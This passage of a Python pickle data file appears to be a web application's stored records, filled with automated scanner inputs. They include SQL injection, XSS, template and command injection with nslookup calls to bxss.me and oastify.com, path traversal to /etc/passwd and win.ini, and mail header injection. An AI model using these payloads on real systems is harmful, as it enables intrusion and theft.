aS'bfg10147\xef\xbc\x9cs1\xef\xb9\xa5s2\xca\xbas3\xca\xb9hjl10147'
p1188
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p1189
aS'"dfbzzzzzzzzbbbccccdddeeexca".replace("z","o")'
p1190
aS'-1" OR 3*2>(0+5+610-610) -- '
p1191
aS'-1" OR 3*2>(0+5+610-610) -- '
p1192
aS'dfb[[${98991*97996}]]xca'
p1193
aS'dfb[[${98991*97996}]]xca'
p1194
aS'-1" OR 3*2<(0+5+610-610) -- '
p1195
aS'-1" OR 3*2<(0+5+610-610) -- '
p1196
aS'-1" OR 3+610-610-1=0+0+0+1 -- '
p1197
aS'-1" OR 3+610-610-1=0+0+0+1 -- '
p1198
aS'dfb{{98991*97996}}xca'
p1199
aS'dfb{{98991*97996}}xca'
p1200
aS'-1" OR 2+610-610-1=0+0+0+1 -- '
p1201
aS'-1" OR 2+610-610-1=0+0+0+1 -- '
p1202
aS'-1" OR 2+610-610-1=0+0+0+1 -- '
p1203
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p1204
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p1205
aS'1}}"}}\'}}1%>"%>\'%><%={{={@{#{${dfb}}%>'
p1206
aS"-1' OR 2+512-512-1=0+0+0+1 or '0hMmGLHu'='"
p1207
aS"-1' OR 2+512-512-1=0+0+0+1 or '0hMmGLHu'='"
p1208
aS"-1' OR 2+512-512-1=0+0+0+1 or '0hMmGLHu'='"
p1209
aS"-1' OR 2+381-381-1=0+0+0+1 -- "
p1210
aS"-1' OR 2+381-381-1=0+0+0+1 -- "
p1211
aS"-1' OR 2+381-381-1=0+0+0+1 -- "
p1212
aS'\\<\\%\\=\\{\\{\\=\\{\\@\\{\\#\\{\\$\\{dfb\\}\\}\\%\\>'
p1213
aS'\\<\\%\\=\\{\\{\\=\\{\\@\\{\\#\\{\\$\\{dfb\\}\\}\\%\\>'
p1214
aS'\\<\\%\\=\\{\\{\\=\\{\\@\\{\\#\\{\\$\\{dfb\\}\\}\\%\\>'
p1215
aS'-1 OR 2+45-45-1=0+0+0+1'
p1216
aS'-1 OR 2+45-45-1=0+0+0+1'
p1217
aS'<%={{={@{#{${dfb}}%>'
p1218
aS'<%={{={@{#{${dfb}}%>'
p1219
aS'-1 OR 3*2>(0+5+84-84) -- '
p1220
aS'-1 OR 3*2>(0+5+84-84) -- '
p1221
aS'-1 OR 3*2>(0+5+84-84) -- '
p1222
aS'-1 OR 3*2>(0+5+84-84) -- '
p1223
aS'<%={{={@{#{${dfb}}%>'
p1224
aS'-1 OR 3*2<(0+5+84-84) -- '
p1225
aS'-1 OR 3*2<(0+5+84-84) -- '
p1226
aS'-1 OR 3+84-84-1=0+0+0+1 -- '
p1227
aS'-1 OR 3+84-84-1=0+0+0+1 -- '
p1228
aS'bfgx3043\xc0\xbez1\xc0\xbcz2a\x90bcxhjl3043'
p1229
aS"'.print(md5(31337)).'"
p1230
aS"'.print(md5(31337)).'"
p1231
aS'${@print(md5(31337))}\\'
p1232
aS'${@print(md5(31337))}\\'
p1233
aS'${@print(md5(31337))}'
p1234
aS'${@print(md5(31337))}'
p1235
aS'5559149040<'
p1236
aS'5559149040<'
p1237
aS'5559149040'
p1238
aS'5559149040'
p1239
aS'555"||sleep(27*1000)*nqxuqy||"'
p1240
aS'555"||sleep(27*1000)*nqxuqy||"'
p1241
aS"555'||sleep(27*1000)*iakznf||'"
p1242
aS"555'||sleep(27*1000)*iakznf||'"
p1243
aS'\'"()&%<zzz><ScRiPt >jxmm(9506)</ScRiPt>'
p1244
aS'\'"()&%<zzz><ScRiPt >jxmm(9506)</ScRiPt>'
p1245
aS'555"&&sleep(27*1000)*qpqkne&&"'
p1246
aS'555"&&sleep(27*1000)*qpqkne&&"'
p1247
aS'<!--'
p1248
aS'<!--'
p1249
aS'bxss.me'
p1250
aS'bxss.me'
p1251
aS'newsnippet2/.'
p1252
aS'newsnippet2/.'
p1253
aS'555\'"()&%<zzz><ScRiPt >jxmm(9229)</ScRiPt>'
p1254
aS"555'&&sleep(27*1000)*deyzma&&'"
p1255
aS'\'"'
p1256
aS'\'"'
p1257
aS'c:/windows/win.ini'
p1258
aS'c:/windows/win.ini'
p1259
aS'to@example.com>\r\nbcc:074625.12-515.12.dfe37.19393.2@bxss.me'
p1260
aS'to@example.com>\r\nbcc:074625.12-515.12.dfe37.19393.2@bxss.me'
p1261
aS'newsnippet2\x00'
p1262
aS'newsnippet2\x00'
p1263
aS'xfs.bxss.me'
p1264
aS'xfs.bxss.me'
p1265
aS"'+'A'.concat(70-3).concat(22*4).concat(118).concat(85).concat(111).concat(77)+(require'socket'\nSocket.gethostbyname('hitlt'+'zdciqrio730ee.bxss.me.')[3].to_s)+'"
p1266
aS"'+'A'.concat(70-3).concat(22*4).concat(118).concat(85).concat(111).concat(77)+(require'socket'\nSocket.gethostbyname('hitlt'+'zdciqrio730ee.bxss.me.')[3].to_s)+'"
p1267
aS')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))'
p1268
aS')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))'
p1269
aS'/etc/shells'
p1270
aS'/etc/shells'
p1271
aS'"'
aS'"'
aS'newsnippet2'
p1272
aS'newsnippet2'
p1273
aS'"+"A".concat(70-3).concat(22*4).concat(118).concat(69).concat(97).concat(71)+(require"socket"\nSocket.gethostbyname("hitye"+"ycrlbfubad6f1.bxss.me.")[3].to_s)+"'
p1274
aS'"+"A".concat(70-3).concat(22*4).concat(118).concat(69).concat(97).concat(71)+(require"socket"\nSocket.gethostbyname("hitye"+"ycrlbfubad6f1.bxss.me.")[3].to_s)+"'
p1275
aS'555'
p1276
aS'555'
p1277
aS'bxss.me/t/xss.html?%00'
p1278
aS'bxss.me/t/xss.html?%00'
p1279
aS'http://bxss.me/t/fit.txt?.jpg'
p1280
aS'http://bxss.me/t/fit.txt?.jpg'
p1281
aS"'"
aS"'"
aS'^(#$!@#$)(()))******'
p1282
aS'^(#$!@#$)(()))******'
p1283
aS'`(nslookup hitqbltkpmvtnb2613.bxss.me||perl -e "gethostbyname(\'hitqbltkpmvtnb2613.bxss.me\')")`'
p1284
aS'`(nslookup hitqbltkpmvtnb2613.bxss.me||perl -e "gethostbyname(\'hitqbltkpmvtnb2613.bxss.me\')")`'
p1285
aS'".gethostbyname(lc("hitdm"."xfmaveca42d2b.bxss.me."))."A".chr(67).chr(hex("58")).chr(108).chr(76).chr(105).chr(77)."'
p1286
aS'".gethostbyname(lc("hitdm"."xfmaveca42d2b.bxss.me."))."A".chr(67).chr(hex("58")).chr(108).chr(76).chr(105).chr(77)."'
p1287
aS'\'"()'
p1288
aS'\'"()'
p1289
aS'HttP://bxss.me/t/xss.html?%00'
p1290
aS'HttP://bxss.me/t/xss.html?%00'
p1291
aS'Http://bxss.me/t/fit.txt'
p1292
aS'Http://bxss.me/t/fit.txt'
p1293
aS'!(()&&!|*|*|'
p1294
aS'!(()&&!|*|*|'
p1295
aS'|(nslookup hitwtgtngoukcfe894.bxss.me||perl -e "gethostbyname(\'hitwtgtngoukcfe894.bxss.me\')")'
p1296
aS'|(nslookup hitwtgtngoukcfe894.bxss.me||perl -e "gethostbyname(\'hitwtgtngoukcfe894.bxss.me\')")'
p1297
aS"'.gethostbyname(lc('hitre'.'kkrvrflgcfc00.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(115).chr(66).chr(113).chr(68).'"
p1298
aS"'.gethostbyname(lc('hitre'.'kkrvrflgcfc00.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(115).chr(66).chr(113).chr(68).'"
p1299
aS'1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs\x00.jpg'
p1300
aS'1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs\x00.jpg'
p1301
aS')'
aS')'
aS'&(nslookup hitxzzlndewxmcd1ac.bxss.me||perl -e "gethostbyname(\'hitxzzlndewxmcd1ac.bxss.me\')")&\'\\"`0&(nslookup hitxzzlndewxmcd1ac.bxss.me||perl -e "gethostbyname(\'hitxzzlndewxmcd1ac.bxss.me\')")&`\''
p1302
aS'&(nslookup hitxzzlndewxmcd1ac.bxss.me||perl -e "gethostbyname(\'hitxzzlndewxmcd1ac.bxss.me\')")&\'\\"`0&(nslookup hitxzzlndewxmcd1ac.bxss.me||perl -e "gethostbyname(\'hitxzzlndewxmcd1ac.bxss.me\')")&`\''
p1303
aS'555&n916191=v995681'
p1304
aS'555&n916191=v995681'
p1305
aS'../555'
p1306
aS'../555'
p1307
aS'http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg'
p1308
aS'http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg'
p1309
aS'${10000469+9999882}'
p1310
aS'${10000469+9999882}'
p1311
aS'&nslookup hitcsgsdspyfkb8f53.bxss.me&\'\\"`0&nslookup hitcsgsdspyfkb8f53.bxss.me&`\''
p1312
aS'&nslookup hitcsgsdspyfkb8f53.bxss.me&\'\\"`0&nslookup hitcsgsdspyfkb8f53.bxss.me&`\''
p1313
aS'555'
p1314
aS'555'
p1315
aS'555<esi:include src="http://bxss.me/rpb.png"/>'
p1316
aS'555<esi:include src="http://bxss.me/rpb.png"/>'
p1317
aS'$(nslookup hitmugopprzdm17514.bxss.me||perl -e "gethostbyname(\'hitmugopprzdm17514.bxss.me\')")'
p1318
aS'$(nslookup hitmugopprzdm17514.bxss.me||perl -e "gethostbyname(\'hitmugopprzdm17514.bxss.me\')")'
p1319
aS'12345\'"\\\'\\")'
p1320
aS'12345\'"\\\'\\")'
p1321
aS'file:///etc/passwd'
p1322
aS'file:///etc/passwd'
p1323
aS'PQqtQ4SL'
p1324
aS'PQqtQ4SL'
p1325
aS'(nslookup hitqtogjsogcl61761.bxss.me||perl -e "gethostbyname(\'hitqtogjsogcl61761.bxss.me\')")'
p1326
aS'(nslookup hitqtogjsogcl61761.bxss.me||perl -e "gethostbyname(\'hitqtogjsogcl61761.bxss.me\')")'
p1327
aS'../../../../../../../../../../../../../../windows/win.ini'
p1328
aS'../../../../../../../../../../../../../../windows/win.ini'
p1329
aS'555\nbcc:074625.12-514.12.dfe37.19393.2@bxss.me'
p1330
aS'555\nbcc:074625.12-514.12.dfe37.19393.2@bxss.me'
p1331
aS'|echo dssakz$()\\ uoktcq\\nz^xyu||a #\' |echo dssakz$()\\ uoktcq\\nz^xyu||a #|" |echo dssakz$()\\ uoktcq\\nz^xyu||a #'
p1332
aS'|echo dssakz$()\\ uoktcq\\nz^xyu||a #\' |echo dssakz$()\\ uoktcq\\nz^xyu||a #|" |echo dssakz$()\\ uoktcq\\nz^xyu||a #'
p1333
aS'"+response.write(9483646*9776684)+"'
p1334
aS'"+response.write(9483646*9776684)+"'
p1335
aS'../../../../../../../../../../../../../../etc/passwd'
p1336
aS'../../../../../../../../../../../../../../etc/passwd'
p1337
aS'gQpAYkGM'
p1338
aS'gQpAYkGM'
p1339
aS'555'
p1340
aS'555'
p1341
aS'&echo hgdppt$()\\ aypamz\\nz^xyu||a #\' &echo hgdppt$()\\ aypamz\\nz^xyu||a #|" &echo hgdppt$()\\ aypamz\\nz^xyu||a #'
p1342
aS'&echo hgdppt$()\\ aypamz\\nz^xyu||a #\' &echo hgdppt$()\\ aypamz\\nz^xyu||a #|" &echo hgdppt$()\\ aypamz\\nz^xyu||a #'
p1343
aS"'+response.write(9483646*9776684)+'"
p1344
aS"'+response.write(9483646*9776684)+'"
p1345
aS'echo xunhbe$()\\ qaqssr\\nz^xyu||a #\' &echo xunhbe$()\\ qaqssr\\nz^xyu||a #|" &echo xunhbe$()\\ qaqssr\\nz^xyu||a #'
p1346
aS'echo xunhbe$()\\ qaqssr\\nz^xyu||a #\' &echo xunhbe$()\\ qaqssr\\nz^xyu||a #|" &echo xunhbe$()\\ qaqssr\\nz^xyu||a #'
p1347
aS'response.write(9483646*9776684)'
p1348
aS'response.write(9483646*9776684)'
p1349
aS'555'
p1350
aS'555'
p1351
aS'1rF2oIMGO'
p1352
aS'1rF2oIMGO'
p1353
aS'555'
p1354
aS'555'
p1355
asg714
S'alesander'
p1356
ssS'/../../../../../WEB-INF/web.xml\x00.js'
p1357
(dp1358
g4
S'True'
p1359
sg6
g1357
sg7
S'1'
ssS'YCgruyjE" / sleep(15) / "'
p1360
(dp1361
g10
S'True'
p1362
sg12
g1360
sg13
NssS'file:///etc/passwd\x00.js'
p1363
(dp1364
g4
S'True'
p1365
sg6
g1363
sg7
S'1'
ssS"case when cast(pg_sleep(15) as varchar) > '' then 0 else 1 end"
p1366
(dp1367
g10
S'True'
p1368
sg12
g1366
sg13
NssS'www.google.com'
p1369
(dp1370
g10
S'True'
p1371
sg12
g1369
sg13
NssS'3578541350414011388.owasp.org'
p1372
(dp1373
g10
S'True'
p1374
sg12
g1372
sg13
NssS'ZAP'
p1375
(dp1376
g705
S'555'
p1377
sg12
S'ZAP'
p1378
sg708
S'http://www.example.com'
p1379
sg710
S'#ffffff'
p1380
sg13
S'c:/Windows/system.ini'
p1381
sg10
S'True'
p1382
sg730
(lp1383
S'ycauhh223mkwd1m5mzotyvsdj5zc2oc8d6a849v9qhf6xroxytjtg0tpcr27'
p1384
aS'ycauhh223mkwd1m5mzotyvsdj5zc2oc8d6a849v9qhf6xroxytjtg0tpcr27'
p1385
aS'case randomblob(1000000000) when not null then 1 else 1 end '
p1386
aS'case randomblob(1000000000) when not null then 1 else 1 end '
p1387
aS'k9ciqgbwd24zqrwicrptlley1t33e8vc4c0t98xdrhc1hitobq8wyj3lx5w'
p1388
aS'k9ciqgbwd24zqrwicrptlley1t33e8vc4c0t98xdrhc1hitobq8wyj3lx5w'
p1389
aS'case randomblob(100000000) when not null then 1 else 1 end '
p1390
aS'case randomblob(100000000) when not null then 1 else 1 end '
p1391
aS'vvdwxuaw9ap3z0k6v1rssy6sqtvwhyu3zhp6vgas4e2n6ms8vlxu7ijgi7'
p1392
aS'vvdwxuaw9ap3z0k6v1rssy6sqtvwhyu3zhp6vgas4e2n6ms8vlxu7ijgi7'
p1393
aS'case randomblob(10000000) when not null then 1 else 1 end '
p1394
aS'case randomblob(10000000) when not null then 1 else 1 end '
p1395
aS'case randomblob(1000000) when not null then 1 else 1 end '
p1396
aS'case randomblob(1000000) when not null then 1 else 1 end '
p1397
aS'case randomblob(100000) when not null then 1 else 1 end '
p1398
aS'case randomblob(100000) when not null then 1 else 1 end '
p1399
aS" / case when cast(pg_sleep(15) as varchar) > '' then 0 else 1 end "
p1400
aS" / case when cast(pg_sleep(15) as varchar) > '' then 0 else 1 end "
p1401
aS'"case when cast(pg_sleep(15) as varchar) > \'\' then 0 else 1 end -- '
p1402
aS'"case when cast(pg_sleep(15) as varchar) > \'\' then 0 else 1 end -- '
p1403
aS"'case when cast(pg_sleep(15) as varchar) > '' then 0 else 1 end -- "
p1404
aS"'case when cast(pg_sleep(15) as varchar) > '' then 0 else 1 end -- "
p1405
aS"case when cast(pg_sleep(15) as varchar) > '' then 0 else 1 end -- "
p1406
aS"case when cast(pg_sleep(15) as varchar) > '' then 0 else 1 end -- "
p1407
aS"case when cast(pg_sleep(15) as varchar) > '' then 0 else 1 end"
p1408
aS"case when cast(pg_sleep(15) as varchar) > '' then 0 else 1 end"
p1409
aS" and exists (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) -- "
p1410
aS" and exists (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) -- "
p1411
aS'" / (SELECT  UTL_INADDR.get_host_name(\'10.0.0.1\') from dual union SELECT  UTL_INADDR.get_host_name(\'10.0.0.2\') from dual union SELECT  UTL_INADDR.get_host_name(\'10.0.0.3\') from dual union SELECT  UTL_INADDR.get_host_name(\'10.0.0.4\') from dual union SELECT  UTL_INADDR.get_host_name(\'10.0.0.5\') from dual) / "'
p1412
aS'" / (SELECT  UTL_INADDR.get_host_name(\'10.0.0.1\') from dual union SELECT  UTL_INADDR.get_host_name(\'10.0.0.2\') from dual union SELECT  UTL_INADDR.get_host_name(\'10.0.0.3\') from dual union SELECT  UTL_INADDR.get_host_name(\'10.0.0.4\') from dual union SELECT  UTL_INADDR.get_host_name(\'10.0.0.5\') from dual) / "'
p1413
aS"' / (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) / '"
p1414
aS"' / (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) / '"
p1415
aS" / (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) "
p1416
aS" / (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) "
p1417
aS"(SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual)"
p1418
aS"(SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual)"
p1419
aS'"java.lang.Thread.sleep"(15000)'
p1420
aS'"java.lang.Thread.sleep"(15000)'
p1421
aS'); select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = \'SYSTEM_COLUMNS\' and COLUMN_NAME = \'TABLE_NAME\' -- '
p1422
aS'); select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = \'SYSTEM_COLUMNS\' and COLUMN_NAME = \'TABLE_NAME\' -- '
p1423
aS'"; select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = \'SYSTEM_COLUMNS\' and COLUMN_NAME = \'TABLE_NAME\' -- '
p1424
aS'"; select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = \'SYSTEM_COLUMNS\' and COLUMN_NAME = \'TABLE_NAME\' -- '
p1425
aS'\'; select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = \'SYSTEM_COLUMNS\' and COLUMN_NAME = \'TABLE_NAME\' -- '
p1426
aS'\'; select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = \'SYSTEM_COLUMNS\' and COLUMN_NAME = \'TABLE_NAME\' -- '
p1427
aS'; select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = \'SYSTEM_COLUMNS\' and COLUMN_NAME = \'TABLE_NAME\' -- '
p1428
aS'; select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = \'SYSTEM_COLUMNS\' and COLUMN_NAME = \'TABLE_NAME\' -- '
p1429
aS'" and 0 in (select sleep(15) ) -- '
p1430
aS'" and 0 in (select sleep(15) ) -- '
p1431
aS"' and 0 in (select sleep(15) ) -- "
p1432
aS"' and 0 in (select sleep(15) ) -- "
p1433
aS' and 0 in (select sleep(15) ) -- '
p1434
aS' and 0 in (select sleep(15) ) -- '
p1435
aS'" / sleep(15) / "'
p1436
aS'" / sleep(15) / "'
p1437
aS"' / sleep(15) / '"
p1438
aS"' / sleep(15) / '"
p1439
aS' / sleep(15) '
p1440
aS' / sleep(15) '
p1441
aS"') UNION ALL select NULL -- "
p1442
aS"') UNION ALL select NULL -- "
p1443
aS') UNION ALL select NULL -- '
p1444
aS') UNION ALL select NULL -- '
p1445
aS'" UNION ALL select NULL -- '
p1446
aS'" UNION ALL select NULL -- '
p1447
aS"' UNION ALL select NULL -- "
p1448
aS"' UNION ALL select NULL -- "
p1449
aS' UNION ALL select NULL -- '
p1450
aS' UNION ALL select NULL -- '
p1451
aS'" AND "1"="1'
p1452
aS'" AND "1"="1'
p1453
aS"' AND '1'='1"
p1454
aS"' AND '1'='1"
p1455
aS' AND 1=1'
p1456
aS' AND 1=1'
p1457
aS'" AND "1"="1" -- '
p1458
aS'" AND "1"="1" -- '
p1459
aS"' AND '1'='1' -- "
p1460
aS"' AND '1'='1' -- "
p1461
aS' AND 1=1 -- '
p1462
aS' AND 1=1 -- '
p1463
aS"'("
p1464
aS"'("
p1465
aS"'("
p1466
aS"'("
p1467
aS';'
aS';'
aS';'
aS';'
aS'"'
aS'"'
aS'"'
aS'"'
aS"'"
aS"'"
aS"'"
aS"'"
aS'<img src=x onerror=alert(1);>'
p1468
aS'<img src=x onerror=alert(1);>'
p1469
aS'</span><script>alert(1);</script><span>'
p1470
aS'</span><script>alert(1);</script><span>'
p1471
aS'0W45pz4p'
p1472
aS'0W45pz4p'
p1473
aS'zApPX3sS'
p1474
aS'zApPX3sS'
p1475
aS'<img src=x onerror=prompt()>'
p1476
aS'<img src=x onerror=prompt()>'
p1477
aS'</div><img src=x onerror=prompt()><div>'
p1478
aS'</div><img src=x onerror=prompt()><div>'
p1479
aS'</div>\x00<scrIpt>alert(1);</scRipt><div>'
p1480
aS'</div>\x00<scrIpt>alert(1);</scRipt><div>'
p1481
aS'</div><scrIpt>alert(1);</scRipt><div>'
p1482
aS'</div><scrIpt>alert(1);</scRipt><div>'
p1483
aS'0W45pz4p'
p1484
aS'0W45pz4p'
p1485
aS'"><!--#EXEC cmd="dir \\"--><'
p1486
aS'"><!--#EXEC cmd="dir \\"--><'
p1487
aS'<!--#EXEC cmd="dir \\"-->'
p1488
aS'<!--#EXEC cmd="dir \\"-->'
p1489
aS'"><!--#EXEC cmd="ls /"--><'
p1490
aS'"><!--#EXEC cmd="ls /"--><'
p1491
aS'<!--#EXEC cmd="ls /"-->'
p1492
aS'<!--#EXEC cmd="ls /"-->'
p1493
aS'//3578541350414011388.owasp.org'
p1494
aS'//3578541350414011388.owasp.org'
p1495
aS'https://\\3578541350414011388.owasp.org'
p1496
aS'https://\\3578541350414011388.owasp.org'
p1497
aS'http://\\3578541350414011388.owasp.org'
p1498
aS'http://\\3578541350414011388.owasp.org'
p1499
aS"URL='http://3578541350414011388.owasp.org'"
p1500
aS"URL='http://3578541350414011388.owasp.org'"
p1501
aS"5;URL='https://3578541350414011388.owasp.org'"
p1502
aS"5;URL='https://3578541350414011388.owasp.org'"
p1503
aS'https://3578541350414011388%2eowasp%2eorg'
p1504
aS'https://3578541350414011388%2eowasp%2eorg'
p1505
aS'https://3578541350414011388.owasp.org'
p1506
aS'https://3578541350414011388.owasp.org'
p1507
aS'http://3578541350414011388.owasp.org'
p1508
aS'http://3578541350414011388.owasp.org'
p1509
aS'3578541350414011388.owasp.org'
p1510
aS'3578541350414011388.owasp.org'
p1511
aS'www.google.com:80/search?q=OWASP%20ZAP'
p1512
aS'www.google.com:80/search?q=OWASP%20ZAP'
p1513
aS'www.google.com/search?q=OWASP%20ZAP'
p1514
aS'www.google.com/search?q=OWASP%20ZAP'
p1515
aS'www.google.com'
p1516
aS'www.google.com'
p1517
aS'www.google.com:80/'
p1518
aS'www.google.com:80/'
p1519
aS'www.google.com/'
p1520
aS'www.google.com/'
p1521
aS'http://www.google.com:80/search?q=OWASP%20ZAP'
p1522
aS'http://www.google.com:80/search?q=OWASP%20ZAP'
p1523
aS'http://www.google.com/search?q=OWASP%20ZAP'
p1524
aS'http://www.google.com/search?q=OWASP%20ZAP'
p1525
aS'http://www.google.com'
p1526
aS'http://www.google.com'
p1527
aS'http://www.google.com:80/'
p1528
aS'http://www.google.com:80/'
p1529
aS'http://www.google.com/'
p1530
aS'http://www.google.com/'
p1531
aS'thishouldnotexistandhopefullyitwillnot'
p1532
aS'thishouldnotexistandhopefullyitwillnot'
p1533
aS'\\WEB-INF\\web.xml'
p1534
aS'\\WEB-INF\\web.xml'
p1535
aS'/WEB-INF/web.xml'
p1536
aS'/WEB-INF/web.xml'
p1537
aS'WEB-INF\\web.xml'
p1538
aS'WEB-INF\\web.xml'
p1539
aS'WEB-INF/web.xml'
p1540
aS'WEB-INF/web.xml'
p1541
aS'../../../../../../../../../../../../../../../../'
p1542
aS'../../../../../../../../../../../../../../../../'
p1543
aS'c:\\'
p1544
aS'c:\\'
p1545
aS'/'
aS'/'
aS'c:/'
p1546
aS'c:/'
p1547
aS'../../../../../../../../../../../../../../../../etc/passwd'
p1548
aS'../../../../../../../../../../../../../../../../etc/passwd'
p1549
aS'/etc/passwd'
p1550
aS'/etc/passwd'
p1551
aS'..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini'
p1552
aS'..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini'
p1553
aS'c:\\Windows\\system.ini'
p1554
aS'c:\\Windows\\system.ini'
p1555
aS'../../../../../../../../../../../../../../../../Windows/system.ini'
p1556
aS'../../../../../../../../../../../../../../../../Windows/system.ini'
p1557
aS'c:/Windows/system.ini'
p1558
aS'c:/Windows/system.ini'
p1559
asg714
S'1'
ssS'\'"<scrIpt>alert(1);</scRipt>'
p1560
(dp1561
g10
S'True'
p1562
sg12
g1560
sg13
NssS'1bogus\nSkipfish-Inject:bogus'
p1563
(dp1564
g4
S'True'
p1565
sg6
g1563
sg7
S'1'
ssS'to@example.com>\r\nbcc:074625.12-412.12.0b9d9.19393.2@bxss.me'
p1566
(dp1567
g10
S'True'
p1568
sg12
g1566
sg13
S'u]H[ww6KrA9F.x-F'
p1569
ssS'${@print(md5(31337))}\\'
p1570
(dp1571
g10
S'True'
p1572
sg12
g1570
sg13
S'u]H[ww6KrA9F.x-F'
p1573
ssS'http://nkb141u7oeugo2bazi9b8n214salyco0eo5bwzl.oastify.com/?bRxNsIAu'
p1574
(dp1575
g4
S'True'
p1576
sg6
g1574
sg7
S'g8S!c8l!X0'
p1577
ssS'...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./...\\./windows/win.ini'
p1578
(dp1579
g4
S'True'
p1580
sg6
g1578
sg7
S'g8S!c8l!X0'
p1581
ssS"vjYTjpqN'+sleep(20.to_i)+'"
p1582
(dp1583
g4
S'True'
p1584
sg6
g1582
sg7
S'g8S!c8l!X0'
p1585
ssS'vjYTjpqN6sp186rg79\xc1\x8127ni8013m0'
p1586
(dp1587
g4
S'True'
p1588
sg6
g1586
sg7
S'g8S!c8l!X0'
p1589
ssS'/../../../../../../WEB-INF/web.xml\x00.js'
p1590
(dp1591
g4
S'True'
p1592
sg6
g1590
sg7
S'1'
ssS'vjYTjpqN}}mb6ar\'/"<s0w3j'
p1593
(dp1594
g4
S'True'
p1595
sg6
g1593
sg7
S'g8S!c8l!X0'
p1596
ssS'vjYTjpqN|nslookup -q=cname 2figzgpmjtpvjh6pux4q32xgz750trjff36qxem.oastify.com.&'
p1597
(dp1598
g4
S'True'
p1599
sg6
g1597
sg7
S'g8S!c8l!X0'
p1600
ssS'//3578541350414011388.owasp.org'
p1601
(dp1602
g10
S'True'
p1603
sg12
g1601
sg13
NssS'saveprofile\x00'
p1604
(dp1605
g10
S'True'
p1606
sg12
g1604
sg13
S'u]H[ww6KrA9F.x-F'
p1607
ssS"vjYTjpqN' and 5845=5845-- "
p1608
(dp1609
g4
S'True'
p1610
sg6
g1608
sg7
S'g8S!c8l!X0'
p1611
ssS'../../../../../../../../../../../../../../../../'
p1612
(dp1613
g10
S'True'
p1614
sg12
g1612
sg13
NssS')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))'
p1615
(dp1616
g10
S'True'
p1617
sg12
g1615
sg13
S'u]H[ww6KrA9F.x-F'
p1618
ssS'b72nucubzs%410gvl38quoy'
p1619
(dp1620
g4
S'True'
p1621
sg6
g1619
sg7
S'g8S!c8l!X0'
p1622
